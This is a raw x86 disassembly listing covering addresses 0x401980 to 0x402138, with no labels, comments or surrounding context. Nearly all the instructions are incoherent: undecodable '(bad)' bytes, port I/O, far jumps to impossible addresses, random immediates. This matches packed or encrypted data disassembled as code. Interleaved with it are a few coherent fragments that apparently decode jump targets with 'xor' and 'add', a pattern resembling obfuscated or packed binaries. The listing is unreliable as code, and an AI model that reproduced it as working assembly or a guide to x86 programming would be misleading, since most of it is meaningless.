  401980:	jmp    0x4019d6
  401982:	repz mov ds:0x683c0ccc,eax
  401988:	jle    0x401916
  40198a:	aam    0x52
  40198c:	jg     0x4019ea
  40198e:	sahf   
  40198f:	push   edx
  401990:	jbe    0x40193c
  401992:	cmp    DWORD PTR [edi],0xc4e72908
  401998:	cdq    
  401999:	push   ebx
  40199a:	mov    bl,0xa7
  40199c:	call   0x8ffe114b
  4019a1:	add    esp,DWORD PTR ds:[eax-0xca34d63]
  4019a8:	inc    esi
  4019a9:	int    0xdc
  4019ab:	je     0x401a08
  4019ad:	jle    0x40197d
  4019af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019b0:	inc    edi
  4019b1:	add    ch,BYTE PTR [esp+ebp*2+0x77d432cb]
  4019b8:	lea    ebx,[ecx-0x74012611]
  4019be:	idiv   DWORD PTR [eax]
  4019c0:	or     BYTE PTR [esi],0xdd
  4019c3:	fsub   st(0),st
  4019c5:	out    0xc6,eax
  4019c7:	dec    esp
  4019c8:	add    eax,0xa94c58ca
  4019cd:	mov    ah,0xad
  4019cf:	retf   
  4019d0:	loopne 0x4019c1
  4019d2:	sbb    eax,0x97efbdee
  4019d7:	inc    eax
  4019d8:	mov    ebp,0x57b08273
  4019dd:	xchg   esp,eax
  4019de:	fnstenv [ecx+0x5]
  4019e1:	xor    eax,0x8f8c5b5e
  4019e6:	push   edi
  4019e7:	xchg   ebx,eax
  4019e8:	in     eax,dx
  4019e9:	jecxz  0x401a1d
  4019eb:	mov    dh,0xaf
  4019ed:	sar    BYTE PTR [esi+0x37],cl
  4019f0:	mov    ds:0xf99351f2,eax
  4019f5:	and    al,0x5f
  4019f7:	pop    ss
  4019f8:	cmc    
  4019f9:	dec    ebp
  4019fa:	fdivr  st(2),st
  4019fc:	outs   dx,DWORD PTR ds:[esi]
  4019fd:	dec    ebx
  4019fe:	mov    WORD PTR [ebp+eiz*2-0x4c61e548],cs
  401a05:	into   
  401a06:	fist   WORD PTR [ebx-0x7c]
  401a09:	adc    DWORD PTR [edi-0x347503af],0x38
  401a10:	cs js  0x401a6a
  401a13:	ret    
  401a14:	gs cmp al,0x2b
  401a17:	popf   
  401a18:	sahf   
  401a19:	loopne 0x401a82
  401a1b:	fiadd  WORD PTR [eax-0x60]
  401a1e:	push   eax
  401a1f:	jle    0x401a79
  401a21:	adc    dl,ch
  401a23:	dec    ecx
  401a24:	cli    
  401a25:	jnp    0x4019ff
  401a27:	test   al,0x12
  401a29:	jp     0x401a46
  401a2b:	retf   
  401a2c:	jne    0x4019b2
  401a2e:	outs   dx,DWORD PTR ds:[esi]
  401a2f:	popa   
  401a30:	fild   WORD PTR ds:0x8d4d5d71
  401a36:	sub    edx,ebx
  401a38:	mov    dh,0x1d
  401a3a:	mov    dh,0x19
  401a3c:	(bad)  
  401a3d:	(bad)  
  401a3e:	shl    esi,cl
  401a40:	not    DWORD PTR [edx-0x2bedbb21]
  401a46:	jmp    0x94b43e24
  401a4b:	sub    esp,0x6da1849c
  401a51:	aad    0xb7
  401a53:	daa    
  401a54:	(bad)  
  401a55:	jmp    0x591c602a
  401a5a:	shl    esp,0x52
  401a5d:	neg    DWORD PTR [esi+0x147bdac0]
  401a63:	mov    ecx,0xd5a866d1
  401a68:	mov    eax,ds:0x156c4eff
  401a6d:	pop    ds
  401a6e:	dec    esi
  401a6f:	mov    gs,WORD PTR [esi]
  401a71:	mov    ebx,0x19766d15
  401a76:	imul   ecx,DWORD PTR [ecx-0x63164fa3],0x1
  401a7d:	add    BYTE PTR [eax],al
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	inc    eax
  401a8c:	fimul  DWORD PTR [ebx-0xc]
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401b04
  401a98:	sbb    DWORD PTR es:0x9d47a40a,ecx
  401a9f:	dec    esp
  401aa0:	pop    ds
  401aa1:	into   
  401aa2:	dec    eax
  401aa3:	jne    0x401a5e
  401aa5:	ins    DWORD PTR es:[edi],dx
  401aa6:	dec    ebp
  401aa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aa8:	xor    DWORD PTR ds:0x2f19e905,0x7e0235a
  401ab2:	dec    edi
  401ab3:	xchg   edi,eax
  401ab4:	or     ebx,ebx
  401ab6:	lock adc BYTE PTR [edi],ch
  401ab9:	or     DWORD PTR [edx-0x4d4cc94f],esp
  401abf:	pop    eax
  401ac0:	fwait
  401ac1:	call   0xf98e08ce
  401ac6:	and    al,0x17
  401ac8:	fsubr  DWORD PTR fs:[eax-0x10]
  401acc:	out    dx,al
  401acd:	push   edx
  401ace:	push   ebp
  401acf:	leave  
  401ad0:	dec    esp
  401ad1:	aas    
  401ad2:	xchg   ecx,eax
  401ad3:	mov    ss,esp
  401ad5:	dec    edi
  401ad6:	adc    al,0x75
  401ad8:	adc    ebp,DWORD PTR [ecx]
  401ada:	enter  0x9702,0x10
  401ade:	xor    al,0x3e
  401ae0:	push   ds
  401ae1:	std    
  401ae2:	mov    ah,0xf5
  401ae4:	ins    BYTE PTR es:[edi],dx
  401ae5:	lods   al,BYTE PTR ds:[esi]
  401ae6:	mov    ah,BYTE PTR [esi+0x6a0f5b4]
  401aec:	push   esi
  401aed:	xor    al,0x6a
  401aef:	cmc    
  401af0:	rcr    BYTE PTR [edx+0x4e],0xc1
  401af4:	inc    ebp
  401af5:	sbb    ebx,DWORD PTR [ebp+0x46]
  401af8:	shr    BYTE PTR [edx+eiz*4],0xbf
  401afc:	ins    BYTE PTR es:[edi],dx
  401afd:	shl    DWORD PTR ds:[ebx],0xaa
  401b01:	jp     0x401b3c
  401b03:	xchg   DWORD PTR [ebx],esp
  401b05:	retf   0xc1e1
  401b08:	fldenv [esi+0x3de0f202]
  401b0e:	leave  
  401b0f:	es je  0x401b0a
  401b12:	sub    DWORD PTR [eax+0x33],eax
  401b15:	sub    al,0x99
  401b17:	or     ah,BYTE PTR [edi+0x23f5653e]
  401b1d:	mov    cs,WORD PTR [ecx]
  401b1f:	add    DWORD PTR [ecx+edi*2+0x1b28cf48],0x24c9f850
  401b2a:	sub    ch,BYTE PTR [edi+edx*8]
  401b2d:	push   ebp
  401b2e:	mov    ecx,0x2c5e6c96
  401b33:	push   ebp
  401b34:	ret    
  401b35:	mov    dl,0x76
  401b37:	xchg   edi,eax
  401b38:	test   al,0x3a
  401b3a:	lea    eax,[edi-0xa]
  401b3d:	mov    cx,0x251b
  401b41:	lahf   
  401b42:	xchg   esi,eax
  401b43:	push   ecx
  401b44:	inc    edx
  401b45:	add    esi,ecx
  401b47:	sahf   
  401b48:	fcomp  QWORD PTR [ebx]
  401b4a:	add    ch,BYTE PTR [ebp-0x58d3f362]
  401b50:	xchg   esi,eax
  401b51:	sbb    esi,esi
  401b53:	mov    al,0x53
  401b55:	add    al,0xee
  401b57:	dec    ecx
  401b58:	repnz daa 
  401b5a:	out    dx,al
  401b5b:	ror    DWORD PTR [edi-0x7e],1
  401b5e:	jno    0x401b18
  401b60:	(bad)  
  401b61:	repnz push esi
  401b63:	xor    DWORD PTR [ecx-0x6b],ebp
  401b66:	dec    edi
  401b67:	fld    QWORD PTR [ebx+edx*8+0x6d]
  401b6c:	(bad)  
  401b6d:	das    
  401b6e:	mov    ds:0xb2569925,al
  401b73:	aad    0x9a
  401b75:	mov    DWORD PTR [ebx-0x1f4b53b],edi
  401b7b:	xlat   BYTE PTR ds:[ebx]
  401b7c:	repz scas al,BYTE PTR es:[edi]
  401b7e:	push   0x5
  401b80:	lods   al,BYTE PTR ds:[esi]
  401b81:	jle    0x401ba9
  401b83:	mov    edi,ebx
  401b85:	xlat   BYTE PTR ds:[ebx]
  401b86:	je     0x401b93
  401b88:	loopne 0x401bca
  401b8a:	push   eax
  401b8b:	jg     0x401b8e
  401b8d:	jecxz  0x401bad
  401b8f:	stos   BYTE PTR es:[edi],al
  401b90:	icebp  
  401b91:	js     0x401bd1
  401b93:	mov    ds:0xcee491c0,al
  401b98:	fbstp  TBYTE PTR [esi+0x4e]
  401b9b:	jo     0x401b4d
  401b9d:	pop    esi
  401b9e:	mov    bl,0x6
  401ba0:	inc    eax
  401ba1:	push   es
  401ba2:	das    
  401ba3:	dec    ecx
  401ba4:	sbb    ch,BYTE PTR [ecx+ebx*4+0x1b]
  401ba8:	out    0xe4,al
  401baa:	and    eax,0xa34286c5
  401baf:	inc    esp
  401bb0:	push   esp
  401bb1:	mov    es,WORD PTR [ebx]
  401bb3:	mov    al,0xbf
  401bb5:	or     ch,BYTE PTR [eax+0x6db3dbb6]
  401bbb:	stos   BYTE PTR es:[edi],al
  401bbc:	mov    dh,0x8b
  401bbe:	scas   al,BYTE PTR es:[edi]
  401bbf:	pop    eax
  401bc0:	push   ds
  401bc1:	add    BYTE PTR ds:0xefef2e41,0x27
  401bc8:	sub    eax,eax
  401bca:	mov    bh,0xc9
  401bcc:	adc    ecx,edi
  401bce:	stos   DWORD PTR es:[edi],eax
  401bcf:	lods   al,BYTE PTR ds:[esi]
  401bd0:	inc    ecx
  401bd1:	lods   al,BYTE PTR ds:[esi]
  401bd2:	in     eax,dx
  401bd3:	mov    ebp,0x55335b2f
  401bd8:	call   0xee639b3a
  401bdd:	ffree  st(1)
  401bdf:	adc    DWORD PTR [edx-0x1f],esp
  401be2:	int3   
  401be3:	bound  esi,QWORD PTR [edi]
  401be5:	adc    DWORD PTR [edx+0x76],edi
  401be8:	rol    BYTE PTR es:[ebx-0x42],cl
  401bec:	pop    eax
  401bed:	jg     0x401b95
  401bef:	and    al,0x8d
  401bf1:	push   ss
  401bf2:	inc    eax
  401bf3:	xor    DWORD PTR [ebp-0x290f643],eax
  401bf9:	cld    
  401bfa:	sbb    ebx,DWORD PTR [eax-0xfd5faea]
  401c00:	sub    DWORD PTR [ebx+0x7bd9b213],edi
  401c06:	inc    ecx
  401c07:	or     eax,0x1c596d82
  401c0c:	aad    0xe1
  401c0e:	out    dx,eax
  401c0f:	add    ah,BYTE PTR [edi+0x3d5fdd56]
  401c15:	js     0x401c7b
  401c17:	repz mov ebp,ebp
  401c1a:	imul   ecx,DWORD PTR [ebx+0x4d8bb045],0x3c633f8
  401c24:	(bad)  
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	ret    
  401c41:	or     eax,0x798a70b3
  401c46:	jle    0x401cc6
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c06
  401c4d:	mov    al,ds:0xae56110c
  401c52:	mov    ?,eax
  401c54:	push   edi
  401c55:	sub    bh,BYTE PTR [edi-0x58]
  401c58:	loop   0x401bdf
  401c5a:	mov    ebx,0x65ad221f
  401c60:	push   es
  401c61:	outs   dx,BYTE PTR ds:[esi]
  401c62:	popf   
  401c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c64:	gs pop ss
  401c66:	pop    edx
  401c67:	xchg   ecx,eax
  401c68:	test   DWORD PTR [ebx+ebp*4-0x2fc2f438],edi
  401c6f:	or     DWORD PTR ds:0x2ba26fd3,edx
  401c75:	and    BYTE PTR ds:0xb91cdc03,bh
  401c7b:	sub    BYTE PTR [eax+0x12e22de8],ch
  401c81:	sbb    eax,0x6111f19a
  401c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c87:	arpl   WORD PTR [ecx+0xb48cf1e],ax
  401c8d:	jl     0x401c32
  401c8f:	fs mov ah,0x48
  401c92:	xchg   ecx,eax
  401c93:	pop    es
  401c94:	leave  
  401c95:	out    0xc,al
  401c97:	inc    eax
  401c98:	or     DWORD PTR [ecx+0x55],0x68
  401c9c:	mov    cl,0x19
  401c9e:	and    al,0x38
  401ca0:	call   0xfa11:0x53d6e92f
  401ca7:	mov    eax,0x400a9c0a
  401cac:	xor    dh,BYTE PTR [edi]
  401cae:	xchg   ebp,eax
  401caf:	inc    esp
  401cb0:	inc    eax
  401cb1:	add    BYTE PTR ds:0x2812a447,bh
  401cb7:	outs   dx,DWORD PTR ds:[esi]
  401cb8:	ror    DWORD PTR [edx+0x770682b8],0x26
  401cbf:	aas    
  401cc0:	add    ebp,DWORD PTR [eax+0x6]
  401cc3:	mov    dh,BYTE PTR [ecx-0x79562401]
  401cc9:	lock inc ecx
  401ccb:	loope  0x401cb6
  401ccd:	adc    edx,eax
  401ccf:	mov    esi,DWORD PTR [ebp+edx*8+0x17bcf7a9]
  401cd6:	or     BYTE PTR [eax+0x333278ac],ch
  401cdc:	mov    ebp,0xc1caddf
  401ce1:	cmp    al,0xf8
  401ce3:	and    eax,0x83d7e462
  401ce8:	jg     0x401d03
  401cea:	mov    cl,0x51
  401cec:	cmovle eax,ebx
  401cef:	xchg   DWORD PTR [edi-0x39],ebp
  401cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cf3:	aaa    
  401cf4:	es or  edi,ebp
  401cf7:	or     eax,esi
  401cf9:	ins    BYTE PTR es:[edi],dx
  401cfa:	lds    esp,FWORD PTR [edi+0x36]
  401cfd:	pop    ecx
  401cfe:	shl    bh,1
  401d00:	pop    ds
  401d01:	dec    eax
  401d02:	icebp  
  401d03:	jmp    0x362e6452
  401d08:	outs   dx,DWORD PTR ds:[esi]
  401d09:	dec    eax
  401d0a:	sahf   
  401d0b:	xchg   ecx,eax
  401d0c:	retf   
  401d0d:	enter  0xfb79,0xa3
  401d11:	ficom  WORD PTR [ecx]
  401d13:	jnp    0x401cc8
  401d15:	fiadd  DWORD PTR [ebp-0x35fbf663]
  401d1b:	pop    ss
  401d1c:	push   ecx
  401d1d:	mov    dl,0x29
  401d1f:	jmp    0xe3f4:0x95933059
  401d26:	test   al,0x4
  401d28:	xor    al,BYTE PTR [ebp+0x1a0ce535]
  401d2e:	push   edi
  401d2f:	shr    ch,cl
  401d31:	jo     0x401d84
  401d33:	mov    eax,0x69f2871f
  401d38:	cmp    edi,ebx
  401d3a:	std    
  401d3b:	mov    bh,0xce
  401d3d:	fld    DWORD PTR [ecx]
  401d3f:	mov    edx,0xa34006f8
  401d44:	xchg   ecx,eax
  401d45:	pop    ds
  401d46:	adc    DWORD PTR [eax-0x12],0x1525b9f5
  401d4d:	cmp    DWORD PTR [esi+edx*8],ebx
  401d50:	jmp    0x9a29b44
  401d55:	(bad)  
  401d56:	(bad)  
  401d57:	cdq    
  401d58:	cmp    al,0x91
  401d5a:	xchg   ebp,eax
  401d5b:	clc    
  401d5c:	jns    0x401cf6
  401d5e:	mov    edx,0xe2e2aec3
  401d63:	addr16 sub esp,edx
  401d66:	push   ebp
  401d67:	scas   eax,DWORD PTR es:[edi]
  401d68:	adc    DWORD PTR [esi+0x2dc77c3c],edi
  401d6e:	pop    esi
  401d6f:	mov    ch,BYTE PTR [esi-0x5b]
  401d72:	xchg   dl,cl
  401d74:	inc    eax
  401d75:	ficomp WORD PTR [esi]
  401d77:	leave  
  401d78:	jmp    0x401d0b
  401d7a:	test   al,0xb2
  401d7c:	and    al,bl
  401d7e:	push   esi
  401d7f:	retf   0x5931
  401d82:	adc    eax,0x34a1f02c
  401d87:	cmp    dl,BYTE PTR [eax-0x1]
  401d8a:	test   BYTE PTR [edi],0x2d
  401d8d:	push   eax
  401d8e:	repz push ds
  401d90:	xlat   BYTE PTR ds:[ebx]
  401d91:	dec    edi
  401d92:	jbe    0x401d9d
  401d94:	fwait
  401d95:	jbe    0x401d46
  401d97:	sbb    al,0x96
  401d99:	jno    0x401d7d
  401d9b:	fcom   DWORD PTR ds:0x9a71d232
  401da1:	mov    edi,0xdb88152a
  401da6:	pop    ecx
  401da7:	push   esp
  401da8:	out    0xf0,al
  401daa:	sbb    al,0xfd
  401dac:	(bad)  
  401dad:	sti    
  401dae:	mov    al,ds:0x507a836b
  401db3:	adc    DWORD PTR [eax+ebp*1+0xb],esp
  401db7:	and    DWORD PTR [ebx-0x571416db],0x9d314992
  401dc1:	sub    DWORD PTR es:[edi+esi*1+0x4],esi
  401dc6:	fwait
  401dc7:	clc    
  401dc8:	mov    al,0x86
  401dca:	cmp    DWORD PTR [ebp+ebx*2+0x40],ebx
  401dce:	int3   
  401dcf:	fwait
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x7cc28ec8],ebp
  401e0d:	daa    
  401e0e:	push   ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e46
  401e17:	jo     0x401e78
  401e19:	nop
  401e1a:	fwait
  401e1b:	xchg   BYTE PTR [esi+0x3cc4cd1f],bl
  401e21:	push   edx
  401e22:	adc    eax,0x76bee541
  401e27:	dec    edx
  401e28:	xchg   ecx,eax
  401e29:	call   0x26d0:0x8800b9b2
  401e30:	jle    0x401e66
  401e32:	dec    ecx
  401e33:	ret    0xf4eb
  401e36:	add    eax,0x8a94fe3d
  401e3b:	in     al,dx
  401e3c:	pop    eax
  401e3d:	or     esp,eax
  401e3f:	sbb    edi,DWORD PTR [eax+0x3e1804e1]
  401e45:	ds mov al,0xe
  401e48:	iret   
  401e49:	imul   esp,DWORD PTR [ebp-0x7],0x8483b087
  401e50:	adc    ebx,DWORD PTR [ebp-0x3b]
  401e53:	shr    dl,0x15
  401e56:	or     BYTE PTR [ebx-0x16],0x39
  401e5a:	xor    ebx,esi
  401e5c:	mov    ebp,0xb136ec1a
  401e61:	nop
  401e62:	cld    
  401e63:	mov    edi,0x9ac1106a
  401e68:	push   esi
  401e69:	xchg   ebp,eax
  401e6a:	ss push esp
  401e6c:	sub    esp,esi
  401e6e:	jp     0x401e73
  401e70:	fsubr  DWORD PTR [ecx+0x31f9ca95]
  401e76:	push   esp
  401e77:	mov    ebx,0x17b977d2
  401e7c:	sti    
  401e7d:	pop    edi
  401e7e:	sti    
  401e7f:	adc    DWORD PTR [ebp+0x2622c25d],ebp
  401e85:	jnp    0x401e1c
  401e87:	push   0x89978c0f
  401e8c:	popa   
  401e8d:	push   edi
  401e8e:	adc    dh,BYTE PTR [ecx-0x1]
  401e91:	hlt    
  401e92:	inc    esp
  401e93:	arpl   di,sp
  401e95:	xchg   BYTE PTR [ebx],al
  401e97:	mov    dh,0x27
  401e99:	mov    ebx,cs
  401e9b:	cmp    esi,DWORD PTR [eax+ecx*1+0x5703cb19]
  401ea2:	dec    eax
  401ea3:	int    0x89
  401ea5:	push   cs
  401ea6:	or     BYTE PTR [eax],bl
  401ea8:	sahf   
  401ea9:	es inc ebx
  401eab:	pop    edx
  401eac:	cmp    BYTE PTR [edx-0x7e65c825],0xe1
  401eb3:	pusha  
  401eb4:	xor    dh,BYTE PTR [eax+0x56]
  401eb7:	xchg   edx,eax
  401eb8:	jge    0x401e93
  401eba:	outs   dx,BYTE PTR ds:[esi]
  401ebb:	adc    ah,BYTE PTR [edi+0x52f266b6]
  401ec1:	push   edi
  401ec2:	inc    dl
  401ec4:	jae    0x401f14
  401ec6:	cmp    BYTE PTR [ecx+0x31c52747],bh
  401ecc:	add    eax,edi
  401ece:	lds    edx,FWORD PTR [eax-0x5b]
  401ed1:	out    0x8d,al
  401ed3:	cmp    dh,BYTE PTR [ecx-0x70]
  401ed6:	xchg   edi,eax
  401ed7:	add    esp,edx
  401ed9:	jmp    0x8080:0x5c443b07
  401ee0:	xor    eax,ebx
  401ee2:	push   esp
  401ee3:	out    0x8b,al
  401ee5:	inc    ebx
  401ee6:	jg     0x401ead
  401ee8:	add    eax,0x7183064c
  401eed:	jmp    0x2117766b
  401ef2:	rol    DWORD PTR [eax+ebx*2+0x25bacc7f],0x7c
  401efa:	or     cl,BYTE PTR [ebx+edx*4]
  401efd:	pop    es
  401efe:	sub    eax,0x28aab24
  401f03:	pusha  
  401f04:	leave  
  401f05:	inc    DWORD PTR [ebx+0x3c79cd82]
  401f0b:	lods   eax,DWORD PTR ds:[esi]
  401f0c:	and    DWORD PTR [ecx-0x5f],edi
  401f0f:	push   esi
  401f10:	fldcw  WORD PTR [ecx+edx*1-0xa7cae9d]
  401f17:	xor    DWORD PTR [ebp+0x6de16e50],esi
  401f1d:	(bad)  
  401f1f:	iret   
  401f20:	jo     0x401f98
  401f22:	aas    
  401f23:	xchg   esi,eax
  401f24:	xchg   BYTE PTR [esi-0x320ab1b2],ch
  401f2a:	ret    0x70f0
  401f2d:	test   al,0x22
  401f2f:	mov    ebx,DWORD PTR [edx+edx*8-0xe]
  401f33:	into   
  401f34:	add    eax,0xcda17b85
  401f3a:	outs   dx,BYTE PTR ds:[esi]
  401f3b:	jecxz  0x401f86
  401f3d:	outs   dx,BYTE PTR ds:[esi]
  401f3e:	jne    0x401ec9
  401f40:	mov    ah,0x71
  401f42:	ins    BYTE PTR es:[edi],dx
  401f43:	and    eax,ebp
  401f45:	mov    WORD PTR gs:[ebx-0x20],?
  401f49:	lea    edx,[edi]
  401f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f4c:	(bad)  
  401f4d:	std    
  401f4e:	cmp    edx,DWORD PTR [eax+0x6a]
  401f51:	cmp    ah,BYTE PTR [ebp+0x3dc82f12]
  401f57:	loop   0x401f29
  401f59:	xor    eax,0x6d26cd
  401f5e:	jae    0x401fb3
  401f60:	xchg   edx,eax
  401f61:	mov    esp,0x909204ad
  401f66:	lods   eax,DWORD PTR ds:[esi]
  401f67:	int3   
  401f68:	ins    DWORD PTR es:[edi],dx
  401f69:	mov    bh,0x1b
  401f6b:	adc    eax,0xad7dbebe
  401f70:	js     0x401f8a
  401f72:	or     DWORD PTR [edx+ecx*2-0x46b4e606],eax
  401f79:	loop   0x401f31
  401f7b:	inc    esi
  401f7c:	clc    
  401f7d:	mov    ebp,0x4d27ba30
  401f82:	mov    esp,0x34dd8703
  401f87:	sar    DWORD PTR [edi-0x7923daf1],0xcd
  401f8e:	int    0x7f
  401f90:	cmp    al,BYTE PTR [edi]
  401f92:	add    ebx,edi
  401f94:	not    DWORD PTR [ecx-0x23]
  401f97:	arpl   WORD PTR [edi],si
  401f99:	jecxz  0x401faa
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x5cee20f7
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x402036
  401fcc:	imul   ebp,DWORD PTR [eax],0x90d2f662
  401fd2:	mov    ebx,0x2e46bde5
  401fd7:	mov    DWORD PTR [edi],edx
  401fd9:	cli    
  401fda:	enter  0x8f62,0x60
  401fde:	pusha  
  401fdf:	popa   
  401fe0:	sbb    DWORD PTR [ecx],esp
  401fe2:	dec    eax
  401fe3:	jne    0x402013
  401fe5:	sub    eax,0x986c15f2
  401fea:	arpl   WORD PTR [eax-0x15],bp
  401fed:	outs   dx,BYTE PTR ds:[esi]
  401fee:	into   
  401fef:	dec    ebx
  401ff0:	mov    al,0x5c
  401ff2:	jmp    0xb69a:0xdb3d6677
  401ff9:	inc    esi
  401ffa:	das    
  401ffb:	or     edi,DWORD PTR [ecx+0x7405f97a]
  402001:	push   cs
  402002:	dec    eax
  402003:	inc    edi
  402004:	fadd   DWORD PTR [ebx+eax*1]
  402007:	dec    eax
  402008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402009:	(bad)  
  40200a:	adc    BYTE PTR [ebx+esi*4+0x7ae46ebd],dh
  402011:	cwde   
  402012:	and    dh,BYTE PTR [edx+0x444d2133]
  402018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402019:	nop
  40201a:	mov    BYTE PTR [edi],ch
  40201c:	mov    ecx,0xe60d475a
  402021:	jge    0x40204e
  402023:	jmp    0x402011
  402025:	nop
  402026:	(bad)  
  402027:	shl    BYTE PTR [edi-0x1436647a],cl
  40202d:	ins    DWORD PTR es:[edi],dx
  40202e:	rcr    BYTE PTR [esi],cl
  402030:	xchg   ecx,eax
  402031:	outs   dx,DWORD PTR ds:[esi]
  402032:	int    0x59
  402034:	scas   eax,DWORD PTR es:[edi]
  402035:	jbe    0x402026
  402037:	mov    ebp,0xb990b59e
  40203c:	cld    
  40203d:	inc    eax
  40203e:	stos   DWORD PTR es:[edi],eax
  40203f:	adc    al,0x80
  402041:	sbb    BYTE PTR [edi-0x7ff7fe5d],al
  402047:	test   al,0x79
  402049:	inc    ebp
  40204a:	push   ebp
  40204b:	mov    ebx,0xf7055522
  402050:	fadd   QWORD PTR ds:0x562cb809
  402056:	push   ebx
  402057:	mov    bl,0x49
  402059:	inc    ebp
  40205a:	std    
  40205b:	cwde   
  40205c:	mov    eax,ds:0x99774883
  402061:	neg    BYTE PTR [ecx+0xd5fdb9a]
  402067:	jnp    0x402070
  402069:	out    dx,al
  40206a:	leave  
  40206b:	mov    bh,ah
  40206d:	mov    ebp,0xad205f3
  402072:	jmp    0x2333:0xf6e93e1b
  402079:	mov    ebx,0xb033bf5d
  40207e:	lahf   
  40207f:	mov    ds:0x4fc25970,al
  402084:	pusha  
  402085:	es inc ebp
  402087:	jae    0x40204c
  402089:	pop    ss
  40208a:	mov    esp,0xf96c3966
  40208f:	je     0x402063
  402091:	sub    bl,ch
  402093:	inc    edi
  402094:	fcomp  st(3)
  402096:	rep ins BYTE PTR es:[edi],dx
  402098:	in     eax,0x79
  40209a:	mov    bh,0xe7
  40209c:	push   ecx
  40209d:	sub    al,BYTE PTR [edx+0x74169056]
  4020a3:	mov    dl,0x4f
  4020a5:	retf   
  4020a6:	jns    0x4020ff
  4020a8:	inc    esp
  4020a9:	icebp  
  4020aa:	(bad)  
  4020ac:	lds    eax,FWORD PTR [ebp-0xae45ef5]
  4020b2:	mov    al,0x36
  4020b4:	fdivr  QWORD PTR [ebx+0x8]
  4020b7:	jl     0x402049
  4020b9:	push   esi
  4020ba:	add    ebp,ecx
  4020bc:	pop    ebp
  4020bd:	inc    ebp
  4020be:	fs ja  0x4020d4
  4020c1:	rcr    eax,1
  4020c3:	repz xchg ebx,eax
  4020c5:	sub    cl,BYTE PTR ds:0x76766125
  4020cb:	popa   
  4020cc:	push   ds
  4020cd:	sbb    esp,esi
  4020cf:	sbb    al,BYTE PTR [ebp+0xf]
  4020d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020d3:	rcr    eax,1
  4020d5:	imul   ebx,DWORD PTR [ecx+esi*2+0x11],0x22596013
  4020dd:	arpl   WORD PTR [ebp+0x381af899],bp
  4020e3:	or     bl,bl
  4020e5:	ret    0x60d4
  4020e8:	adc    al,0x30
  4020ea:	imul   edi,DWORD PTR [esi+0x7f],0x14617a08
  4020f1:	into   
  4020f2:	lahf   
  4020f3:	and    BYTE PTR [ebx],ch
  4020f5:	in     al,0x8
  4020f7:	cmp    al,0xc3
  4020f9:	sti    
  4020fa:	cmp    al,0x17
  4020fc:	cmp    eax,0x5b27d58
  402101:	stc    
  402102:	pop    esp
  402103:	inc    edi
  402104:	mov    dl,0xb3
  402106:	pop    ebx
  402107:	lods   eax,DWORD PTR ds:[esi]
  402108:	fdiv   DWORD PTR [ebp+0x21]
  40210b:	xor    BYTE PTR [eax-0x1297f9dc],ch
  402111:	mov    ah,0x4e
  402113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402116:	mov    bh,BYTE PTR [ebx+edi*8+0xa735644]
  40211d:	jle    0x40216d
  40211f:	out    dx,al
  402120:	mov    eax,0xab6df9bb
  402125:	addr16 (bad) 
  402127:	mov    al,0x6
  402129:	push   eax
  40212a:	jge    0x40219b
  40212c:	ja     0x4021a5
  40212e:	mov    ecx,edx
  402130:	dec    eax
  402131:	(bad)
  402134:	pop    es
  402135:	push   es
  402136:	and    al,0x4
  402138:	sub    ebx,DWORD PTR ds:0x3206e3c4
